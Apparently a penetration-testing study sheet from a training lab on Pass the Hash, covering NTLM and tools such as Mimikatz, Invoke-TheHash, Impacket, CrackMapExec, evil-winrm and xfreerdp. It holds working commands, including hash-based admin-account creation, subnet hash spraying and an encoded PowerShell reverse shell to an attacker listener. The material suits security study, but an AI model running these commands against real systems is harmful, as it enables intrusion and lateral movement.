### Pass the Hash (PtH)

[Pass the Hash (PtH)](https://attack.mitre.org/techniques/T1550/002/)

```
# A PtH attack is a technique where an attacker uses a password hash instead of the plain text password for authentication.
# The attacker doesn't need to decrypt the hash to obtain a plaintext password. 
# PtH attacks exploit the authentication protocol, 
# as the password hash remains static for every session until the password is changed.

# Attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash.
# Hashes can be obtained in several ways, including:

- Dumping the local SAM database from a compromised host.
- Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.
- Pulling the hashes from memory (lsass.exe).
```

### Windows NTLM Introduction

[Windows New Technology LAN Manager (NTLM)](https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview)

```
# NTLM is a set of security protocols that authenticates users' identities 
# while also protecting the integrity and confidentiality of their data. 
# NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol 
# to verify the user's identity without having them provide a password.

# While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism 
# in Windows 2000 and subsequent Active Directory (AD) domains.

# With NTLM, passwords stored on the server and domain controller are not "salted," 
# which means that an adversary with a password hash can authenticate a session without knowing the original password. 
# We call this a Pass the Hash (PtH) Attack.
```

### Pass the Hash with Mimikatz (Windows)

[Mimikatz](https://github.com/gentilkiwi)

```
# Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack 
# by starting a process using the hash of the user's password. 
# To use this module, we will need the following:

/user         - The user name we want to impersonate.
/rc4 or /NTLM - NTLM hash of the user's password.
/domain       - Domain the user to impersonate belongs to. 
                In the case of a local user account, we can use the computer name, localhost, or a dot (.).
/run          - The program we want to run with the user's context (if not specified, it will launch cmd.exe).
```

```
# Pass the Hash from Windows Using Mimikatz
# with known username and hash value:

c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit

type \\dc01\\julio\julio.txt           # connecting to Domain Controller host (DC01) shared folder
```

### Pass the Hash with PowerShell Invoke-TheHash (Windows)

[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

```
# This tool above is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. 
# Local administrator privileges are not required client-side, 
# but the user and hash we use to authenticate need to have administrative rights on the target computer.

# To use this tool, we need to specify the following parameters to execute commands in the target computer:

Target      - Hostname or IP address of the target.
Username    - Username to use for authentication.
Domain      - Domain to use for authentication.This parameter is unnecessary with local accounts or @domain after the username.
Hash        - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.
Command     - Command to execute on the target. If a command is not specified, the function will check user WMI access. 

# Command below will use the SMB method for command execution to create a new user named mark 
# and add the user to the Administrators group.:

cd C:\tools\Invoke-TheHash\
c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

[Reverse Shell Generator](https://www.revshells.com/)

```
# Netcat Listener 
# We can also get a reverse shell connection in the target machine.:
C:\tools> .\nc.exe -lvnp 8001         # on cmd
listening on [any] 8001 ...

# To create a simple reverse shell using PowerShell, 
# we can visit https://www.revshells.com/, set our IP 172.16.1.5 and port 8001, 
# and select the option PowerShell #3 (Base64)


# Now we can execute Invoke-TheHash to execute our PowerShell reverse shell script in the target computer. 
# Notice that instead of providing the IP address, which is 172.16.1.10, 
# we will use the machine name DC01 (either would work).
# (in second session of PS terminal, keep first with listening nc.exe)

PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

### Pass the Hash with Impacket (Linux) 

[Impacket](https://github.com/SecureAuthCorp/impacket)

```
# Impacket has several tools we can use for different operations such as Command Execution 
# and Credential Dumping, Enumeration, etc. 
# For this example, we will perform command execution on the target machine using PsExec.:

impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453   # Run with admin user and known hash
output:
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.201.126.....
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe

```

```
# There are several other tools in the Impacket toolkit we can use for command execution using Pass the Hash attacks, 
# such as:
```

[impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
[impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
[impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)

### Pass the Hash with CrackMapExec (Linux)

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

```
# CrackMapExec is a post-exploitation tool that helps automate assessing the security of large Active Directory networks. 
# We can use CrackMapExec to try to authenticate to some or all hosts in a network 
# looking for one host where we can authenticate successfully as a local admin. 
# This method is also called "Password Spraying":

crackmapexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453    # Run with admin and known hash

# Note that this method can lock out domain accounts, so keep the target domain's account lockout policy in mind.

# If we want to perform the same actions but attempt to authenticate to each host in a subnet 
# using the local administrator password hash, we could add --local-auth to our command.

# If we see Pwn3d!, it means that the user is a local administrator on the target computer. 
# We can use the option -x to execute commands. 
# It is common to see password reuse against many hosts in the same subnet. 
# Organizations will often use gold images with the same local admin password 
# or set this password the same across multiple hosts for ease of administration. 

# To fix admin passwords reuse it's a good idea look into "Local Administrator Password Solution (LAPS)"
```

```
# CrackMapExec - Command Execution

crackmapexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

### Pass the Hash with evil-winrm (Linux)

[evil-winrm](https://github.com/Hackplayers/evil-winrm)

```
# Another tool we can use to authenticate using the Pass the Hash attack with PowerShell remoting. 
# If SMB is blocked or we don't have administrative rights, 
# we can use this alternative protocol to connect to the target machine.

evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

# Note: When using a domain account, we need to include the domain name, for example: administrator@inlanefreight.htb
```

### Pass the Hash with RDP (Linux)

```
# We can perform an RDP PtH attack to gain GUI access to the target system using tools like xfreerdp
# There are a few caveats to this attack:

- Restricted Admin Mode, which is disabled by default, should be enabled on the target host;

# This can be enabled by adding a new registry key DisableRestrictedAdmin (REG_DWORD) 
# under HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa with the value of 0.:

c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

# Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access:

xfreerdp  /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

### UAC Limits Pass the Hash for Local Accounts

```
# UAC (User Account Control) limits local users' ability to perform remote administration operations. 
# When the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy is 0, 
# it means that the built-in local admin account (RID-500, "Administrator") is the only local account allowed 
# to perform remote administration tasks. 
# Setting it to 1 allows the other local admins as well.

# Note: 
# There is one exception, if the registry key FilterAdministratorToken (disabled by default) is enabled (value 1), 
# the RID 500 account (even if it is renamed) is enrolled in UAC protection. 
# This means that remote PTH will fail against the machine when using that account.

# These settings are only for local administrative accounts. 
# If we get access to a domain account with administrative rights on a computer, 
# we can still use Pass the Hash with that computer.
